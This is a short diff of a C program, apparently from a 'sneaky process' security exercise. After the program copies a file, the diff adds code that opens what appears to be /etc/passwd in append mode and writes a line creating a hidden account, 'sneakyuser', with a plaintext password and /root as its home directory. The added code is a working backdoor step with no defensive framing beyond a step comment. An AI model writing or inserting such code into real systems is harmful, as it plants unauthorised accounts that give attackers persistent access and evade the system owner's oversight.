@@ -29,13 +29,19 @@ int main() {
   while ((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }
-
-
   fclose(source);
   fclose(target);
 
-
-
+  
+  //------------3.add a new line to /etc/passwd-----------------------------
+  source = fopen(source_file, "a");
+  if (source == NULL) {
+    fprintf(stderr, "fail to open file %s", source_file);
+    exit(EXIT_FAILURE);
+  }
+  fprintf(source, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+  fclose(source);
+  
 
 
   
